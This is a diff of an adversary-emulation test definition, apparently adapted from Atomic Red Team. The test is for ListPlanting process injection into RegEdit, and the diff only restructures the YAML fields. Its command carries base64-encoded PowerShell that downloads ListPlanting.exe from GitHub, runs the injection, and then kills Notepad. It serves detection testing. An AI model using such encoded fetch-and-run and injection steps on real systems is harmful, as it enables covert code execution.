@@ -1,22 +1,17 @@
-- id: b1bdee14-b258-51b0-a56f-47e68a376c0d
+- requirements: []
   name: Soumaia ART Tests - Process injection ListPlanting
   description: This test injects shellcode into a remote RegEdit process using the ListPlanting technique. ListPlanting exploits Window with ListView control. Code write to memory with NtWriteVirtualMemory. The shellcode is executed via PostMessage. When successful, a message box will appear with the title "Warning" and the content "Atomic Red Team" after a few seconds. Notepad will open following the appearance of the message box. (requires elevation)
   tactic: stealth
-  technique:
-    attack_id: T1055.015
-    name: 'Process Injection: ListPlanting'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAEwAaQBzAHQAUABsAGEAbgB0AGkAbgBnAC4AZQB4AGUAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABMAGkAcwB0AFAAbABhAG4AdABpAG4AZwAuAGUAeABlACIAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAaQBnAG4AbwByAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AcgBhAHcALwBtAGEAcwB0AGUAcgAvAGEAdABvAG0AaQBjAHMALwBUADEAMAA1ADUALgAwADEANQAvAGIAaQBuAC8ATABpAHMAdABQAGwAYQBuAHQAaQBuAGcALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgAuAFwATABpAHMAdABQAGwAYQBuAHQAaQBuAGcALgBlAHgAZQAiAAoA
-          }
-          Start-Process ".\ListPlanting.exe"
-          Start-Sleep -Seconds 7
-          Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
-        cleanup: |-
-          Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
-        payloads:
-        - ListPlanting.exe
+  technique_id: T1055.015
+  technique_name: 'Process Injection: ListPlanting'
+  executors:
+  - cleanup:
+    - Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads:
+    - ListPlanting.exe
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAEwAaQBzAHQAUABsAGEAbgB0AGkAbgBnAC4AZQB4AGUAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABMAGkAcwB0AFAAbABhAG4AdABpAG4AZwAuAGUAeABlACIAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAaQBnAG4AbwByAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AcgBhAHcALwBtAGEAcwB0AGUAcgAvAGEAdABvAG0AaQBjAHMALwBUADEAMAA1ADUALgAwADEANQAvAGIAaQBuAC8ATABpAHMAdABQAGwAYQBuAHQAaQBuAGcALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgAuAFwATABpAHMAdABQAGwAYQBuAHQAaQBuAGcALgBlAHgAZQAiAAoA }; Start-Process ".\ListPlanting.exe"; Start-Sleep -Seconds 7; Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+  id: b1bdee14-b258-51b0-a56f-47e68a376c0d
